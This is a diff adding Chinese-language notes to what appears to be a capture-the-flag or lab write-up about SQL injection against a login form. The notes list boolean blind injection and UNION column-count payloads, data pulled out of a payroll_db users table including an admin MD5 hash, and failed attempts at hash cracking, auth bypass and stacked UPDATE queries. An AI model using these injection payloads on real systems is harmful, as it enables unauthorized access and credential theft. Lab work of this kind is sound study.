@@ -107,3 +107,39 @@ SELECT CONCAT(@@secure_file_priv, 0x7c, CURRENT_USER(), 0x7c, @@datadir)
    均返回 `password`，需要更精确地推断第二段 SQL）。
 3. 检查是否存在 `dashboard.php` 的「登录后才有」的隐藏参数（例如 `?user_id=`），
    先想办法拿到任意会话（例如通过 upload 的未授权分支）。
+
+## 补充：2026-10-28（新 token 场次）——布尔盲注可用
+
+这次实例的登录接口是 `POST /index.php`，返回 JSON：`{"response":"Success"|"password"|"username"}`。
+
+| username | password | response |
+| --- | --- | --- |
+| `admin` | 任意 | `password`（用户存在） |
+| `admin' AND 1=1 -- -` | `xxxxxxxx` | `password` |
+| `admin' AND 1=2 -- -` | `xxxxxxxx` | `username` |
+| `' UNION SELECT 1 -- -` | | `password`（1 列） |
+| `' UNION SELECT 1,2 -- -` | | `username`（列数不符） |
+
+判据：`AND 1=1 / 1=2` 的响应不同 → `username` 参数是 **布尔盲注**（MySQL，`-- -` 注释有效），
+且 `SELECT` 只取 1 列（`users` 表）。
+
+用 ASCII/SUBSTR 二分可完整拖库（脚本见探索记录逻辑）：
+
+```text
+DATABASE()  -> payroll_db
+tables      -> users
+columns     -> user_id,username,password
+rows        -> 1 条：admin
+password    -> 7d39307ae824e70052c0aa16816a9b16   (32 hex)
+```
+
+`LOAD_FILE()` 不可用（`user_privileges` 为空），所以读不了 `dashboard.php`。
+
+## 卡点
+
+- `password` 列是 32 位 hex，疑似 md5；用 100 万常用口令、`md5(md5(x))`、
+  `md5(sha1(x))`、大写变体都未命中。
+- 尝试在 `username` 里 `UNION SELECT 0x<md5>`（想控制密码比对结果）无效，
+  说明「校验用户名」和「校验密码」是两条不同的查询，密码那条没有拼接用户输入。
+- 堆叠 `; UPDATE users SET password=...` 不生效（多语句被禁）。
+- 结论：本题只差「admin 明文口令」这一步；盲注与哈希提取已验证，爆破未成功。
